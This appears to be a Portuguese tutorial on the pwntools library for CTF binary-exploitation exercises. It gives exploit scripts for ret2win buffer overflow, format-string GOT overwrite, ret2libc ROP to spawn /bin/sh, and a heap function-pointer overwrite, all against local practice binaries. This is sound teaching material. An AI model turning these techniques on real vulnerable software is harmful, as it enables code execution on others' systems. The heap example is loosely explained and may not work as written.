# Introdução à biblioteca
## Funcionalidades Principais da Pwntools para os CTF's
1. Automatização de Exploits
2. Interação Facilitada com Desafios Remotos
3. Construção e Envio de Payloads
4. Análise de Binários
5. Suporte a Diversas Plataformas

## Exercícios clássicos de PWN
1. Buffer Overflow (Ret2Win)
   - Explorar um programa vulnerável a buffer overflow para redirecionar a execução para uma função específica (geralmente chamada de win ou flag).
2. Format String Exploit
   - Explorar um string bug para ler ou escrever na memória.
3. ROP Chain (Ret2libc)
   - Explorar um programa usando uma cadeia ROP para chamar terminal root com /bin/sh como argumento.
4. Heap Exploitation
   Explorar uma vulnerabilidade de alocação de heap para modificar estruturas internas e obter controle do programa.

# Exemplos práticos
## 1. Buffer Overflow (Ret2Win)
```py
from pwn import *

# Carrega o binário
elf = ELF('./ret2win')

# Define o processo ou conexão remota
p = process(elf.path)

# Endereço da função win
win_addr = elf.symbols['win']

# Calcula o offset até o EIP/RIP
offset = 40  # usualmente determinado por técnicas como pattern_create e pattern_offset

# Constrói o payload
payload = b'A' * offset + p64(win_addr)

# Envia o payload
p.sendline(payload)

# Entra em modo interativo para capturar a saída
p.interactive()

```
## 2. Format String Exploit
```py
from pwn import *

# Carrega o binário
elf = ELF('./format_string')

# Define o processo ou conexão remota
p = process(elf.path)

# Endereço da função win
win_addr = elf.symbols['win']

# Calcula o offset da string de formato
offset = 6  # usualmente determinado por técnicas de fuzzing

# Cria um payload para sobrescrever a função puts na GOT com o endereço da função win
payload = fmtstr_payload(offset, {elf.got['puts']: win_addr})

# Envia o payload
p.sendline(payload)

# Interage com o processo
p.interactive()

```
## 3. ROP Chain (Ret2libc)
```py
from pwn import *

# Carrega o binário
elf = ELF('./ret2libc')

# Define o processo ou conexão remota
p = process(elf.path)

# Encontra as funções e strings necessárias
libc = elf.libc
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

# Constrói o payload
offset = 40
payload = b'A' * offset + rop.chain()

# Envia o payload para vazar o endereço de puts
p.sendline(payload)
p.recvline()

# Calcula o endereço base da libc
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

# Constrói a cadeia ROP para chamar system('/bin/sh')
rop = ROP(libc)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

# Constrói o payload final
payload = b'A' * offset + rop.chain()

# Envia o payload final
p.sendline(payload)

# Interage com o processo
p.interactive()

```
## 4. Heap Exploitation
```py
from pwn import *

# Carrega o binário
elf = ELF('./heap_exploit')

# Define o processo ou conexão remota
p = process(elf.path)

# Exploração de um chunk duplo livre para sobrescrever o ponteiro de função
p.sendline(b'1')
p.sendline(b'64')
p.sendline(b'A' * 64)

p.sendline(b'1')
p.sendline(b'64')
p.sendline(b'B' * 64)

p.sendline(b'3')
p.sendline(b'0')

p.sendline(b'3')
p.sendline(b'1')

# Aloca um novo chunk e sobrescreve o ponteiro de função
p.sendline(b'1')
p.sendline(b'64')
p.sendline(b'C' * 56 + p64(elf.symbols['win']))

# Chama a função vulnerável que usa o ponteiro sobrescrito
p.sendline(b'2')
p.sendline(b'0')

# Interage com o processo
p.interactive()

```
